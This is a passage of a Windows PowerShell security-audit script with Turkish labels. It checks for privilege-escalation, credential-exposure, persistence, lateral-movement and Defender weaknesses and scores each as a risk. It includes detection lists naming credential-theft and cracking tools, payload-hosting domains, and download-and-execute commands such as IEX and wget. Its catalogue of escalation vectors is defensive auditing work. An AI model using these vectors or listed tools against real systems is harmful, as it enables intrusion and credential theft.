if ($alwaysInstall.AlwaysInstallElevated -eq 1 -or $alwaysInstallUser.AlwaysInstallElevated -eq 1) {
    PrintLine "AlwaysInstallElevated" "Aktif - RISK!" "RISK"
    RiskEkle -Oge "AlwaysInstallElevated" -Aciklama "Herkes MSI ile SYSTEM yetkisiyle kurulum yapabilir" -Puan 5
} else {
    PrintLine "AlwaysInstallElevated" "Pasif" "OK"
}

# Unquoted Service Paths
$unquotedServices = @()
$q = [char]34
try {
    $services = Get-WmiObject -Class Win32_Service -ErrorAction SilentlyContinue
    foreach ($svc in $services) {
        if ($svc.($s2) -and -not $svc.($s2).StartsWith($q) -and $svc.($s2) -match " ") {
            $unquotedServices += "$($svc.Name): $($svc.($s2))"
        }
    }
} catch {}
if ($unquotedServices.Count -gt 0) {
    PrintLine "Unquoted Service Paths" "$($unquotedServices.Count) bulundu" "UYARI"
    RiskEkle -Oge "Unquoted Service Path" -Aciklama "Bosluk iceren yollar, DLL hijacking riski" -Puan 3
} else {
    PrintLine "Unquoted Service Paths" "Yok" "OK"
}

# SeImpersonatePrivilege
$tokenPrivs = @()
try {
    $whoami = whoami /priv 2>$null
    foreach ($line in $whoami) {
        if ($line -match "SeImpersonatePrivilege") {
            $tokenPrivs += "SeImpersonatePrivilege"
        }
        if ($line -match "SeAssignPrimaryPrivilege") {
            $tokenPrivs += "SeAssignPrimaryPrivilege"
        }
        if ($line -match "SeBackupPrivilege") {
            $tokenPrivs += "SeBackupPrivilege"
        }
        if ($line -match "SeRestorePrivilege") {
            $tokenPrivs += "SeRestorePrivilege"
        }
        if ($line -match "SeDebugPrivilege") {
            $tokenPrivs += "SeDebugPrivilege"
        }
    }
} catch {}
if ($tokenPrivs) {
    PrintLine "Aktif Token Yetkileri"
    foreach ($priv in $tokenPrivs) {
        PrintLine "  $priv"
    }
} else {
    PrintLine "Token Yetkileri" "Tespit Edilemedi" "UYARI"
}

# Modifiable Service Binaries
$modServices = @()
$q = [char]34
try {
    $allServices = Get-WmiObject -Class Win32_Service -ErrorAction SilentlyContinue
    foreach ($svc in $allServices) {
        if ($svc.($s2)) {
            $path = $svc.($s2).Replace($q,"").Split(" ")[0]
            if (Test-Path $path) {
                $acl = Get-Acl $path -ErrorAction SilentlyContinue
                if ($acl) {
                    $users = $acl.Access | Where-Object {$_.FileSystemRights -match "Write|Modify|FullControl"}
                    if ($users) {
                        $modServices += "$($svc.Name) -> $($users.IdentityReference)"
                    }
                }
            }
        }
    }
} catch {}
if ($modServices.Count -gt 0) {
    PrintLine "Yazilabilir Servis Binary" "$($modServices.Count) bulundu" "RISK"
    RiskEkle -Oge "Modifiable Service Binary" -Aciklama "Kullanici degistirebilecek servis binary var" -Puan 5
} else {
    PrintLine "Yazilabilir Servis Binary" "Yok" "OK"
}

# Weak Registry Permissions
$weakReg = @()
$regPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
)
foreach ($regPath in $regPaths) {
    try {
        if (Test-Path $regPath) {
            $acl = Get-Acl $regPath -ErrorAction SilentlyContinue
            if ($acl) {
                $weak = $acl.Access | Where-Object {$_.FileSystemRights -match "Write|Modify|FullControl" -and $_.IdentityReference -notmatch "NT AUTHORITY|SYSTEM|BUILTIN"}
                if ($weak) {
                    $weakReg += "$regPath -> $($weak.IdentityReference)"
                }
            }
        }
    } catch {}
}
if ($weakReg.Count -gt 0) {
    PrintLine "Zayif Registry Izinleri" "$($weakReg.Count) bulundu" "UYARI"
    RiskEkle -Oge "Weak Registry Permissions" -Aciklama "Normal kullanicilar yazabilir" -Puan 3
} else {
    PrintLine "Zayif Registry Izinleri" "Yok" "OK"
}

# Scheduled Task Permissions
$weakTasks = @()
try {
    if ($script:PSVersion -ge 3) {
        $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue
        foreach ($task in $tasks) {
            if ($task.Actions -and $task.Principal.RunLevel -eq "Highest") {
                $weakTasks += "$($task.TaskName) (Highest)"
            }
        }
    }
} catch {}
if ($weakTasks.Count -gt 0) {
    PrintLine "Root/Highest Task Sayisi" $weakTasks.Count "OK"
} else {
    PrintLine "Scheduled Tasks" "Tespit Edilemedi" "UYARI"
}

# ============================================
# 39. ZAYIF SISTEM YAPILANDIRMASI
# ============================================
SectionTitle "39. ZAYIF SISTEM YAPILANDIRMASI"

# Weak Password Policy
try {
    $net = net accounts 2>$null
    $minLen = 0
    foreach ($line in $net) {
        if ($line -match "Minimum password length.*: (\d+)") {
            $minLen = [int]$matches[1]
        }
    }
    if ($minLen -lt 12) {
        PrintLine "Min Sifre Uzunlugu" "$minLen karakter" "RISK"
        RiskEkle -Oge "Zayif Sifre Politikasi" -Aciklama "Minimum 12 karakter gerekli" -Puan 4
    } else {
        PrintLine "Min Sifre Uzunlugu" "$minLen karakter" "OK"
    }
} catch {}

# Guest Account
try {
    $guest = Get-LocalUser -Name "Guest" -ErrorAction SilentlyContinue
    if ($guest -and $guest.Enabled) {
        PrintLine "Guest Hesabi" "Aktif" "RISK"
        RiskEkle -Oge "Guest Hesabi Aktif" -Aciklama "Guest hesabi etkin" -Puan 3
    } else {
        PrintLine "Guest Hesabi" "Devre disi" "OK"
    }
} catch {}

# Remote Registry
$remoteReg = Get-Service -Name RemoteRegistry -ErrorAction SilentlyContinue
if ($remoteReg -and $remoteReg.Status -eq "Running") {
    PrintLine "Remote Registry" "Calisiyor" "RISK"
    RiskEkle -Oge "Remote Registry Aktif" -Aciklama "Uzaktan registry erisimi acik" -Puan 4
} else {
    PrintLine "Remote Registry" "Durmus" "OK"
}

# Windows Installer Service
$msiserver = Get-Service -Name msiserver -ErrorAction SilentlyContinue
PrintLine "Windows Installer" "$($msiserver.Status)" "OK"

# ============================================
# 40. CREDENTIAL ACCESS TESPITI
# ============================================
SectionTitle "40. CREDENTIAL ACCESS TESPITI"

# WDigest
$wdigest = RegistryGet -Yol "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Ad "UseLogonCredential"
if ($wdigest.UseLogonCredential -eq 1) {
    PrintLine "WDigest" "Aktif - RISK!" "RISK"
    RiskEkle -Oge "WDigest Credential" -Aciklama "Plain-text sifre bellekte saklaniyor" -Puan 5
} else {
    PrintLine "WDigest" "Pasif" "OK"
}

# Cached Credentials
$cached = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" -Ad "CachedLogonsCount"
if ($cached.CachedLogonsCount -gt 10) {
    PrintLine "Cached Logons" "$($cached.CachedLogonsCount) - Risk" "UYARI"
    RiskEkle -Oge "Cached Credentials" -Aciklama "Cok fazla cached logon sayisi" -Puan 2
} else {
    PrintLine "Cached Logons" $cached.CachedLogonsCount "OK"
}

# AutoAdminLogon
$autoLogon = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" -Ad "AutoAdminLogon"
if ($autoLogon.AutoAdminLogon -eq 1) {
    PrintLine "AutoAdminLogon" "Aktif - RISK!" "RISK"
    RiskEkle -Oge "AutoAdminLogon" -Aciklama "Sifre plaintext saklaniyor" -Puan 5
} else {
    PrintLine "AutoAdminLogon" "Pasif" "OK"
}

# Credential Manager
$credFound = $false
try {
    if (Test-Command "Get-StoredCredential") {
        $cred = Get-StoredCredential -ErrorAction SilentlyContinue
        if ($cred) {
            $credFound = $true
            PrintLine "Stored Credentials" "$($cred.Count) bulundu" "UYARI"
        }
    }
} catch {}
if (-not $credFound) {
    PrintLine "Credential Manager" "Tespit Edilemedi" "OK"
}

# LSA Protection
$lsaPPL = RegistryGet -Yol "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Ad "RunAsPPL"
PrintLine "LSA RunAsPPL" $(if($lsaPPL.RunAsPPL -eq 1){"Aktif"}else{"Pasif"}) $(if($lsaPPL.RunAsPPL -eq 1){"OK"}else{"UYARI"})
if ($lsaPPL.RunAsPPL -ne 1) { RiskEkle -Oge "LSA PPL Yok" -Aciklama "LSA koruma devre disi" -Puan 4 }

# ============================================
# 41. LATERAL MOVEMENT TESPITI
# ============================================
SectionTitle "41. LATERAL MOVEMENT TESPITI"

# RDP Sessions
try {
    $rdpSessions = query user 2>$null
    if ($rdpSessions) {
        PrintLine "Aktif RDP Sessions" "Var" "UYARI"
        $rdpSessions | Select-Object -Skip 1 | ForEach-Object {
            PrintLine "  $_"
        }
    } else {
        PrintLine "Aktif RDP Sessions" "Yok" "OK"
    }
} catch {}

# SMB Sessions
try {
    $smbSessions = Get-SmbSession -ErrorAction SilentlyContinue
    if ($smbSessions) {
        PrintLine "Aktif SMB Sessions" "$($smbSessions.Count)" "UYARI"
    } else {
        PrintLine "Aktif SMB Sessions" "Yok" "OK"
    }
} catch {}

# WinRM Sessions
$winrmService = Get-Service -Name WinRM -ErrorAction SilentlyContinue
if ($winrmService.Status -eq "Running") {
    PrintLine "WinRM Servisi" "Calisiyor" "UYARI"
    RiskEkle -Oge "WinRM Aktif" -Aciklama "Lateral movement vektoru" -Puan 3
} else {
    PrintLine "WinRM Servisi" "Durmus" "OK"
}

# Scheduled Tasks (Remote)
$schedTasks = @()
try {
    if ($script:PSVersion -ge 3) {
        $schedTasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {$_.TaskPath -like "\\Microsoft\\*"}
    }
} catch {}
PrintLine "Microsoft Scheduled Tasks" $schedTasks.Count "OK"

# WMI Remote
$winmgmt = Get-Service -Name winmgmt -ErrorAction SilentlyContinue
PrintLine "WMI Servisi" "$($winmgmt.Status)" "OK"

# ============================================
# 42. PERSISTENCE TESPITI
# ============================================
SectionTitle "42. PERSISTENCE TESPITI"

# Autorun Locations
$autorunKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)
$autorunCount = 0
foreach ($key in $autorunKeys) {
    try {
        if (Test-Path $key) {
            $props = Get-ItemProperty $key -ErrorAction SilentlyContinue
            if ($props) {
                $autorunCount += ($props.PSObject.Properties | Where-Object {$_.Name -notlike "PS*"}).Count
            }
        }
    } catch {}
}
PrintLine "Autorun Entries" $autorunCount "OK"

# Services with Auto Start
$autoServices = Get-WmiObject -Class Win32_Service | Where-Object {$_.($s0) -eq $s1 -and $_.StartMode -eq "Auto"}
PrintLine "Auto Services (System)" $autoServices.Count "OK"

# Registry Run Keys (HKCU vs HKLM)
$hklmRun = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue).PSObject.Properties.Count
$hkcuRun = (Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue).PSObject.Properties.Count
PrintLine "HKLM Run Keys" $hklmRun "OK"
PrintLine "HKCU Run Keys" $hkcuRun "OK"

# DLL Search Order Hijacking
$systemDlls = @()
$envPath = [Environment]::GetFolderPath("System")
try {
    $dlls = Get-ChildItem -Path $envPath -Filter "*.dll" -ErrorAction SilentlyContinue | Select-Object -First 10
    foreach ($dll in $dlls) {
        $systemDlls += $dll.Name
    }
} catch {}
PrintLine "System DLLs" "$($systemDlls.Count) bulundu" "OK"

# ============================================
# 43. DEFENSE EVASION TESPITI
# ============================================
SectionTitle "43. DEFENSE EVASION TESPITI"

# PowerShell v2
$ps2 = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" -Ad "PowerShellVersion"
if ($ps2.PowerShellVersion -eq "2.0") {
    PrintLine "PowerShell v2" "Yuklu - RISK!" "RISK"
    RiskEkle -Oge "PowerShell v2" -Aciklama "Eski surum guvenlik riski" -Puan 4
} else {
    PrintLine "PowerShell v2" "Yok" "OK"
}

# AMSI Bypass Attempts
$amsi = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\AMSI" -Ad "Enable" -ErrorAction SilentlyContinue
PrintLine "AMSI Durumu" $(if($null -ne $amsi){"Yapilandirildi"}else{"Default"}) "OK"

# Event Log Clearing
$securityLog = Get-WinEvent -LogName Security -MaxEvents 1 -ErrorAction SilentlyContinue
if ($securityLog) {
    $logTime = $securityLog.TimeCreated.ToString("yyyy-MM-dd HH:mm")
    PrintLine "Son Security Event" $logTime "OK"
} else {
    PrintLine "Security Log" "Erisilemedi" "UYARI"
}

# Windows Defender Disabled
try {
    $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
    if ($defender -and $defender.RealTimeProtectionEnabled -eq $false) {
        PrintLine "Defender RT Protection" "Devre disi" "RISK"
        RiskEkle -Oge "Defender Kapali" -Aciklama "Real-time koruma devre disi" -Puan 5
    } else {
        PrintLine "Defender RT Protection" "Aktif" "OK"
    }
} catch {}

# ============================================
# 44. COLLECTION TESPITI
# ============================================
SectionTitle "44. COLLECTION TESPITI"

# Clipboard Access
try {
    Add-Type -AssemblyName System.Windows.Forms
    $clipboard = [System.Windows.Forms.Clipboard]::GetText()
    if ($clipboard) {
        PrintLine "Clipboard" "Veri var" "UYARI"
    } else {
        PrintLine "Clipboard" "Bos" "OK"
    }
} catch {
    PrintLine "Clipboard" "Tespit Edilemedi" "OK"
}

# Recent Documents
$recentPath = [Environment]::GetFolderPath("Recent")
try {
    $recentFiles = Get-ChildItem -Path $recentPath -File -ErrorAction SilentlyContinue | Measure-Object
    PrintLine "Recent Files" "$($recentFiles.Count)" "OK"
} catch {}

# Downloads Folder
$downloadPath = [Environment]::GetFolderPath("Personal")
$downloadPath = Join-Path $downloadPath "Downloads"
try {
    if (Test-Path $downloadPath) {
        $downloadFiles = Get-ChildItem -Path $downloadPath -File -ErrorAction SilentlyContinue | Measure-Object
        PrintLine "Downloads" "$($downloadFiles.Count) dosya" "OK"
    }
} catch {}

# ============================================
# 45. EXFILTRATION TESPITI
# ============================================
SectionTitle "45. EXFILTRATION TESPITI"

# Large Outbound Connections
try {
    $connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Where-Object {$_.RemotePort -ne 445 -and $_.RemotePort -ne 135}
    PrintLine "Aktif TCP Connections" $connections.Count "OK"
} catch {}

# DNS Queries
try {
    $dns = Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 10
    PrintLine "DNS Cache Entries" "$($dns.Count)" "OK"
} catch {}

# Network Shares
$shares = Get-WmiObject -Class Win32_Share -ErrorAction SilentlyContinue
PrintLine "Network Shares" "$($shares.Count)" "OK"

# ============================================
# 46. PROCES ANALIZI
# ============================================
SectionTitle "46. PROCES ANALIZI"

# Suspicious Processes
$suspiciousProcs = @()
$procNames = @($m0, $m4, $p0, $m3, $m1, $m2, $p1, $p2, $p3, $p4, "fgdump", "kerberoast", "hashcat")
$runningProcs = Get-Process -ErrorAction SilentlyContinue
foreach ($proc in $runningProcs) {
    foreach ($susp in $procNames) {
        if ($proc.ProcessName -like "*$susp*") {
            $suspiciousProcs += "$($proc.ProcessName) (PID: $($proc.Id))"
        }
    }
}
if ($suspiciousProcs.Count -gt 0) {
    PrintLine "Supici Process" "$($suspiciousProcs.Count) bulundu" "RISK"
    foreach ($sp in $suspiciousProcs) {
        PrintLine "  $sp"
    }
    RiskEkle -Oge "Supici Process" -Aciklama "Tehlikeli process bulundu" -Puan 5
} else {
    PrintLine "Supici Process" "Yok" "OK"
}

# High CPU Processes
$highCpu = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, CPU, Id
PrintLine " Yuksek CPU (Top 5)"
foreach ($p in $highCpu) {
    $cpuStr = $p.CPU.ToString("N1")
    PrintLine "  $($p.Name)" "CPU: $cpuStr sn"
}

# Processes from Temp
$tempProcs = @()
foreach ($proc in $runningProcs) {
    try {
        $path = $proc.Path
        if ($path -and $path -like "*Temp*") {
            $tempProcs += "$($proc.ProcessName): $path"
        }
    } catch {}
}
if ($tempProcs.Count -gt 0) {
    PrintLine "Temp den Calisan" "$($tempProcs.Count)" "UYARI"
} else {
    PrintLine "Temp den Calisan" "Yok" "OK"
}

# Orphaned Processes (No Parent)
$orphanCount = 0
foreach ($proc in $runningProcs) {
    try {
        $parent = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        if (-not $parent.Parent.Id) { $orphanCount++ }
    } catch {}
}
PrintLine "Orphan Processes" $orphanCount "OK"

# ============================================
# 47. AG BAGLANTILARI DETAY
# ============================================
SectionTitle "47. AG BAGLANTILARI DETAY"

# Established Connections
$estConn = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue
PrintLine "Established Connections" $estConn.Count "OK"
if ($Detayli -or $Tam) {
    $estConn | Select-Object -First 10 | ForEach-Object {
        PrintLine "  $($_.LocalAddress):$($_.LocalPort)" "$($_.RemoteAddress):$($_.RemotePort)"
    }
}

# Listening on External Interface
$listening = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue | Where-Object {$_.LocalAddress -notlike "127.*" -and $_.LocalAddress -notlike "0.*"}
PrintLine "Dis Ariza Dinleme" $listening.Count "OK"

# DNS Queries (Suspicious)
$suspiciousDNS = @()
$dnsQueries = Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 50
foreach ($d in $dnsQueries) {
    if ($d.Entry -match "pastebin|githubusercontent|raw\.github|mega|npmcdn|jsdelivr") {
        $suspiciousDNS += $d.Entry
    }
}
if ($suspiciousDNS.Count -gt 0) {
    PrintLine "Supici DNS" "$($suspiciousDNS.Count) bulundu" "RISK"
    RiskEkle -Oge "Supici DNS Sorgusu" -Aciklama "Olasi C2 iletisimi" -Puan 4
} else {
    PrintLine "Supici DNS" "Yok" "OK"
}

# ARP Table
$arp = arp -a 2>$null | Select-String "dynamic"
PrintLine "ARP Entries" "$($arp.Count)" "OK"

# ============================================
# 48. TARAYICI VERILERI
# ============================================
SectionTitle "48. TARAYICI VERILERI"

# Chrome History
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
if (Test-Path $chromePath) {
    PrintLine "Chrome History" "Var" "OK"
} else {
    PrintLine "Chrome History" "Yok" "OK"
}

# Edge History
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
if (Test-Path $edgePath) {
    PrintLine "Edge History" "Var" "OK"
} else {
    PrintLine "Edge History" "Yok" "OK"
}

# Firefox Profiles
$firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxPath) {
    $ffProfiles = Get-ChildItem $firefoxPath -Directory -ErrorAction SilentlyContinue
    PrintLine "Firefox Profiles" "$($ffProfiles.Count)" "OK"
} else {
    PrintLine "Firefox" "Yok" "OK"
}

# ============================================
# 49. EVENT LOG DERIN ANALIZ
# ============================================
SectionTitle "49. EVENT LOG DERIN ANALIZ"

# Failed Logins
try {
    $failedLogins = Get-WinEvent -FilterHashtable @{LogName="Security";ID=4625} -MaxEvents 10 -ErrorAction SilentlyContinue
    if ($failedLogins) {
        PrintLine "Basarisiz Giris (4625)" "$($failedLogins.Count)" "UYARI"
    } else {
        PrintLine "Basarisiz Giris" "Yok" "OK"
    }
} catch {}

# Successful Logins
try {
    $successLogins = Get-WinEvent -FilterHashtable @{LogName="Security";ID=4624} -MaxEvents 5 -ErrorAction SilentlyContinue
    if ($successLogins) {
        PrintLine "Basarili Giris (4624)" "$($successLogins.Count)" "OK"
    }
} catch {}

# PowerShell Events
try {
    $psEvents = Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-PowerShell/Operational";ID=4104} -MaxEvents 5 -ErrorAction SilentlyContinue
    if ($psEvents) {
        PrintLine "PowerShell ScriptBlock" "$($psEvents.Count)" "UYARI"
    } else {
        PrintLine "PowerShell Logging" "Yok" "OK"
    }
} catch {}

# Service Creation
try {
    $svcEvents = Get-WinEvent -FilterHashtable @{LogName="Security";ID=4688} -MaxEvents 5 -ErrorAction SilentlyContinue | Where-Object {$_.Message -match "Service Control Manager"}
    if ($svcEvents) {
        PrintLine "Yeni Servis Olusturma" "$($svcEvents.Count)" "OK"
    }
} catch {}

# ============================================
# 50. SISTEM ENTEGRITE
# ============================================
SectionTitle "50. SISTEM ENTEGRITE KONTROLU"

# System File Integrity - SFC yerine hizli kontrol
$sfcResult = $null
try {
    $sfcJob = Start-Job -ScriptBlock { sfc /verifyonly 2>$null | Select-String "violation" } -ErrorAction SilentlyContinue
    if ($sfcJob) {
        $sfcResult = Wait-Job $sfcJob -Timeout 5 -ErrorAction SilentlyContinue | Receive-Job -ErrorAction SilentlyContinue
        Remove-Job $sfcJob -Force -ErrorAction SilentlyContinue
    }
} catch {}
if ($sfcResult) {
    PrintLine "Bozuk Sistem Dosyasi" "Var" "RISK"
    RiskEkle -Oge "Bozuk Sistem Dosyasi" -Aciklama "SFC ihlal tespit edildi" -Puan 3
} else {
    PrintLine "Sistem Dosyalari" "Tamam" "OK"
}

# Windows Update Status
$wu = Get-Service -Name wuauserv -ErrorAction SilentlyContinue
PrintLine "Windows Update" "$($wu.Status)" "OK"

# Last Boot Time
try {
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $lastBoot = $os.ConvertToDateTime($os.LastBootUpTime)
    $uptime = (Get-Date) - $lastBoot
    PrintLine "Uptime" "$($uptime.Days) gun" "OK"
} catch {}

# Disk Space
$disks = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3"
foreach ($disk in $disks) {
    $freeGB = [math]::Round($disk.FreeSpace/1GB,2)
    $totalGB = [math]::Round($disk.Size/1GB,2)
    $percentFree = [math]::Round(($freeGB/$totalGB)*100,1)
    $diskDurum = if($percentFree -lt 10){"RISK"}else{"OK"}
    PrintLine "$($disk.DeviceID) Disk" "$freeGB GB bos / $totalGB GB ($percentFree)" $diskDurum
    if ($percentFree -lt 10) { RiskEkle -Oge "Dusuk Disk Alani" -Aciklama "Disk alani kritik" -Puan 2 }
}

# ============================================
# 51. WMI AKTIVITESI
# ============================================
SectionTitle "51. WMI AKTIVITESI"

# WMI Consumers (Malicious WMI)
$wmiConsumers = Get-WmiObject -Namespace root\subscription -Class __EventConsumer -ErrorAction SilentlyContinue
if ($wmiConsumers) {
    PrintLine "WMI Consumers" "$($wmiConsumers.Count)" "UYARI"
    foreach ($wc in $wmiConsumers) {
        if ($wc.Name -like "*Script*" -or $wc.Name -like "*Command*") {
            PrintLine "  Supici Consumer" "$($wc.Name)" "RISK"
            RiskEkle -Oge "WMI Consumer" -Aciklama "Supici WMI consumer bulundu" -Puan 5
        }
    }
} else {
    PrintLine "WMI Consumers" "Yok" "OK"
}

# WMI Filters
$wmiFilters = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue
PrintLine "WMI Filters" "$($wmiFilters.Count)" "OK"

# WMI Permanent Event Subscriptions
$wmiSubs = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue
PrintLine "WMI Subscriptions" "$($wmiSubs.Count)" "OK"

# ============================================
# 52. POWERSHELL GECMISI
# ============================================
SectionTitle "52. POWERSHELL GECMISI"

# PSReadLine History
$psHistoryPath = "$env:APPDATA\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $psHistoryPath) {
    $psHistory = Get-Content $psHistoryPath -ErrorAction SilentlyContinue
    $historyCount = ($psHistory | Measure-Object).Count
    PrintLine "PSReadLine History" "$historyCount komut" "OK"
    
    # Check for suspicious commands
    $suspCommands = @("Invoke-", "Download", "IEX", "Invoke-Expression", "New-Object", "Start-Process", "Invoke-WebRequest", "curl", "wget")
    $foundSusp = $false
    foreach ($cmd in $suspCommands) {
        if ($psHistory -match $cmd) {
            $foundSusp = $true
            break
        }
    }
    if ($foundSusp) {
        PrintLine "Supici Komut" "Var" "UYARI"
    }
} else {
    PrintLine "PSReadLine History" "Yok" "OK"
}

# PowerShell Profiles
$psProfilePaths = @(
    "$env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1",
    "$env:USERPROFILE\Documents\PowerShell\Microsoft.PowerShell_profile.ps1",
    "$env:SystemRoot\System32\WindowsPowerShell\v1.0\profile.ps1"
)
$profileCount = 0
foreach ($profPath in $psProfilePaths) {
    if (Test-Path $profPath) {
        $profileCount++
        PrintLine "Profile" "$profPath" "UYARI"
    }
}
if ($profileCount -eq 0) {
    PrintLine "PowerShell Profiles" "Yok" "OK"
}

# ============================================
# 53. REGISTRY DERIN ANALIZ
# ============================================
SectionTitle "53. REGISTRY DERIN ANALIZ"

# Winlogon Keys
$winlogon = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" -Ad "Shell"
PrintLine "Winlogon Shell" $winlogon.Shell "OK"

# UserInit Key
$userInit = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" -Ad "Userinit"
PrintLine "Userinit" $userInit.Userinit "OK"

# AppInit DLLs
$appInit = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Ad "AppInit_DLLs"
if ($appInit.AppInit_DLLs) {
    PrintLine "AppInit DLLs" "$($appInit.AppInit_DLLs)" "UYARI"
    RiskEkle -Oge "AppInit DLL" -Aciklama "DLL injection vektoru" -Puan 4
} else {
    PrintLine "AppInit DLLs" "Bos" "OK"
}

# Known DLLs
$knownDlls = RegistryGet -Yol "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" -Ad "DllDirectory"
PrintLine "Known DLL Directory" $knownDlls.DllDirectory "OK"

# ============================================
# 54. SERVIS DERIN ANALIZI
# ============================================
SectionTitle "54. SERVIS DERIN ANALIZI"

# Services with SYSTEM privileges
$sysServices = Get-WmiObject -Class Win32_Service | Where-Object {$_.($s0) -eq $s1}
PrintLine "SYSTEM Servisleri" "$($sysServices.Count)" "OK"

# Services with Unquoted Paths
$unquotedSvcs = @()
$q = [char]34
foreach ($svc in $sysServices) {
    if ($svc.($s2) -and -not $svc.($s2).StartsWith($q) -and $svc.($s2) -match " ") {
        $unquotedSvcs += $svc.Name
    }
}
if ($unquotedSvcs.Count -gt 0) {
    PrintLine "Unquoted Path Servis" "$($unquotedSvcs.Count)" "UYARI"
} else {
    PrintLine "Unquoted Path Servis" "Yok" "OK"
}

# Services with Binary Path Modification
$modPathSvcs = @()
$q = [char]34
foreach ($svc in $sysServices) {
    if ($svc.($s2)) {
        $path = $svc.($s2).Replace($q,"")
        if (-not (Test-Path $path)) {
            $modPathSvcs += "$($svc.Name) - Path not found"
        }
    }
}
if ($modPathSvcs.Count -gt 0) {
    PrintLine "Eksik Servis Binary" "$($modPathSvcs.Count)" "RISK"
    RiskEkle -Oge "Eksik Servis Binary" -Aciklama "Olasi hijacking" -Puan 3
} else {
    PrintLine "Eksik Servis Binary" "Yok" "OK"
}

# ============================================
# 55. AG GUVENLIK DUYARLILIKLARI
# ============================================
SectionTitle "55. AG GUVENLIK DUYARLILIKLARI"

# SMBv1 Status
$smb1 = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB1" -ErrorAction SilentlyContinue
if ($smb1.SMB1 -ne 0) {
    PrintLine "SMBv1" "Aktif - KRITIK!" "RISK"
    RiskEkle -Oge "SMBv1 Aktif" -Aciklama "EternalBlue ve benzeri exploitler" -Puan 5
} else {
    PrintLine "SMBv1" "Devre disi" "OK"
}

# SMB Signing
$smbSign = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -ErrorAction SilentlyContinue
PrintLine "SMB Imza Gerekli" $(if($smbSign.RequireSecuritySignature -eq 1){"Evet"}else{"Hayir"}) $(if($smbSign.RequireSecuritySignature -eq 1){"OK"}else{"UYARI"})

# NetBIOS over TCP
$netbios = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select-Object -First 1
if ($netbios.TcpipNetbiosOptions -eq 2) {
    PrintLine "NetBIOS" "Devre disi" "OK"
} elseif ($netbios.TcpipNetbiosOptions -eq 0) {
    PrintLine "NetBIOS" "Otomatik" "OK"
} else {
    PrintLine "NetBIOS" "Aktif" "UYARI"
}

# LLMR Resolution
$llmnr = RegistryGet -Yol "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Ad "EnableMulticast"
if ($llmnr.EnableMulticast -eq 0) {
    PrintLine "LLMNR" "Devre disi" "OK"
} else {
    PrintLine "LLMNR" "Aktif - RISK" "UYARI"
    RiskEkle -Oge "LLMNR Aktif" -Aciklama "Man-in-the-middle riski" -Puan 3
}

# ============================================
# 56. WINDOWS DEFENDER DETAY
# ============================================
SectionTitle "56. WINDOWS DEFENDER DETAY"

$defenderReady = $false
try {
    if (Test-Command "Get-MpComputerStatus") {
        $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defender) {
            $defenderReady = $true
            PrintLine "Antivirus" "Microsoft Defender" "OK"
            PrintLine "Signature Age" "$($defender.AntivirusSignatureAge) gun" "OK"
            PrintLine "RealTime Protection" $(if($defender.RealTimeProtectionEnabled){"Aktif"}else{"Pasif"}) $(if($defender.RealTimeProtectionEnabled){"OK"}else{"RISK"})
            PrintLine "Behavior Monitoring" $(if($defender.BehaviorMonitorEnabled){"Aktif"}else{"Pasif"}) "OK"
            PrintLine "Script Scanning" $(if($defender.ScriptScanEnabled){"Aktif"}else{"Pasif"}) "OK"
            
            if ($defender.AntivirusSignatureAge -gt 7) {
                PrintLine "Signature" "Eski - RISK" "RISK"
